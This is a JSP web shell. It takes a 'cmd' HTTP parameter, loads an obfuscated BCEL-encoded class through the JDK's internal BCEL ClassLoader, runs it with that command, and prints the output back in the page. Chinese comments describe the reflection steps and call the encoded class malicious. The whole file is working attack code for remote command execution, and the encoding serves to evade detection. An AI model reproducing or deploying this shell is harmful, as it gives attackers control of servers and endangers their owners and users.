<%@ page import="java.lang.reflect.Constructor" %>
<%@ page language="java" pageEncoding="utf-8" %>
<%
    String cmd  = request.getParameter("cmd");
    String bcel = "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$dbR$TA$Q$3d$T6$99$b0$y$EB$b8$c4$bbx$n$84KPT$U$Q4$I$K$84$8b$60a$e5q$b3$Zp1$d9M$r$h$K$bf$c8W$ad$d2$c4$92$w$l$7d$f0G$y$ff$c1$S$7bv$DI$8aX$3e$a4w$a6OO$f7$e93$3d$f9$f1$e7$eb7$ASx$a9$a2$H$J$8eI$V$3e$qT$dc$c1$5di$a68$eeq$dcW$f1$A$d3$w8$k$aa$I$e0$91432p6$889$f9$7d$dc$8en$ccs$yp$3ca$f0$e9$r$86p$ea$40$3f$d4$T9$dd$daO$ec8E$d3$da$9fe$I$cc$99$96$e9$cc3$f4$c5$ce$c3$p$bb$M$ca$a2$9d$V$M$a1$94i$89$8dr$3e$p$8a$af$f4LN$c8t$b6$a1$e7v$f5$a2$v$f75$a7$e2$bc1$a9Tg$w$ff$$c$88$5cb$e9P$cfQ$956$p$9f$ro$c9M$9b$y$9b$b9$ac$u2D$cfU$acAt$82$X$8a$b6$nJ$94$ab$b7$nj$cbs$S$ee$cbP$82A$P2$edD$b2$bc$b7$t$8a$o$bb$zt$ef$3c$d3$a9$de$8e$a3$ho$d7$f5$82K$ce$d5$e2$v$e9$c9$91$q$N$Z$d4$a5$pC$U$i$d3$b6J$i$8b$MA$c7$f6X0Db$p$ad$c4Rw$ecr$d1$Q$cb$a6l$b5$5d$f66$n$a34D$f0$8ca$e0$l$ddp$yiX$c6s$N$_$b0$c2$d0$df$9a3$c9q$K$acX$85$b2C$v$84$9e$f70b$aca$Vk$b2PJ$9au$N$h$Y$d3$b0$89$zjU$d50$wwa$f42t4$u$cf$d0$5d$e7$b4$999$Q$86$d3$e4$3am$b7$e7$9c$c2$q$7b$ddw$a6$T$5ddL$ceDC$fcv$d9r$cc$3c$c9$a1$ee$L$e7l$d3$d7$a4_$cdM$C$w$e2H$Y$M$c3$adf$ad$e55wQ$d6$G9H$e4$d3$cc$cd$3aQ$e8$60$ac$r$m$f9$f6$d6$a1$da$80Ho$90$f0$ac$ikz$Fz$a1$m$y$g$d1$f1$ff0k$kS$5c$a7G$d6C$af$95$$A$aaO$x$l$ad$o$e8$a3o$3f$ed$7e$c2O$P$TX$8bW$c1$8e$e1KW$d1$b6$fe$F$cah$F$fe$8dc$E$d2$c7$e0$e9$f1$K$82U$b4W$a1$ce$uQ$a5$82$8e$f4$8c$ff$3b$c2cQ$7f$FZ$b8$93$cc$eb$f7$t$bf$e2c$Vt$7dF$e8$p$a5k$c3$A$d9$n$E$c9$aaP$d0$B$Nr$y$3a$RC$88$fe$3a$ba$91$q$3a$abDc$90$o$e6$3d$K$88$e2$C$e0$ae$$$SUF$t$Wp$J$97$89j$E$d3$b8$82$ab$947$86$h$b8Fm$v$98$a4$a8$n$8a$f3$93$H$84$faN$I$f4s$dc$e4$b8$c5q$9bc$98$93$D$bf$R$r$HF$uF$a1$9cq$fa$d1$y$92$95$ed$t$5ca$A$7f$fc$TB$l$5cu$q$f1$80$eb$8c$ba$e44$_$a0F$8e$$$c0$8d$9a$f8$LjU$fa$K$G$F$A$A";
    Class<?> cl = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    //使用Class的newInstance方法初来初始化对象 （Class的newInstance方法只能使用无参构造函数来初始化对象）
    ClassLoader loader = (ClassLoader) cl.newInstance();
    Class<?> cl1=loader.loadClass(bcel);

    //获取到bcel编码里面恶意类构造函数（参数为String）的构造器
    Constructor cs = cl1.getConstructor(String.class);
    //利用构造器初始化的newInstance方法来初始化对象
    Object ob = cs.newInstance(cmd);
    response.getWriter().print("<pre>");
    response.getWriter().print(ob.toString());

    response.getWriter().print("</pre>");
%>